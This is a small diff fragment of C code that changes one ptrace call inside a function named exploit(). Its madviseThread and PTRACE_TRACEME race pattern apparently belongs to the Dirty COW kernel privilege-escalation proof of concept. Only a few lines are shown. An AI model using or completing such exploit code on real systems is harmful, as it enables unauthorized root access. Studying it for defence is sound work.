@@ -224,7 +224,7 @@ static void exploit(struct mem_arg *mem_arg)
 			pthread_join(pth3, NULL);
 		} else {
 			pthread_create(&pth1, NULL, madviseThread, mem_arg);
-			ptrace(PTRACE_TRACEME, NULL, NULL, NULL);
+			ptrace(PTRACE_TRACEME, getpid(), NULL, NULL);
 			kill(getpid(),SIGSTOP);
 			// we're done, tell madviseThread to stop and wait for it
 			mem_arg->stop = 1;
